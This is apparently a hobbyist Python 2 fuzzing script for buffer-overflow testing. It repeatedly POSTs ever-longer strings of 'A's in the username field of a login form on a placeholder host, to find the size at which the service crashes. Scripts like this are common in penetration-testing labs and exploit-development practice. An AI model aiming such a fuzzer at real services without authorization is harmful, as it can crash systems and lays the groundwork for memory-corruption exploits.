#!/usr/bin/python
# D4nk0St0rM
# spread l0ve & knowl3dge

import sys
import socket
import time

size = 100

while True:
    try:
        print "\nSending D4nk0 buffer - %s bytes..." % size
        inputbuffer = "A" * size
        content = "username=" + inputbuffer + "&password=A"
        buffer = "POST /login HTTP/1.1\r\n"
        buffer += "Host:IPADDRESS\r\n"
        buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        buffer += "Accept-Language: en-US,en;q=0.5\r\n"
        buffer += "Referer: http://IPADDRESS/login\r\n"
        buffer += "Connection: close\r\n"
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += "Content-Length: "+str(len(content))+"\r\n"
        buffer += "\r\n"

        buffer += content
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("IPADDRESS",80))
        print ("[+] Sending the payload...\n" + str(len(inputbuffer)))
        s.send(buffer)
        s.close()
        size += 100
        time.sleep(10)
    except:
        print ("The fuzzing crashed at %s bytes" % str(len(inputbuffer)))
        sys.exit()
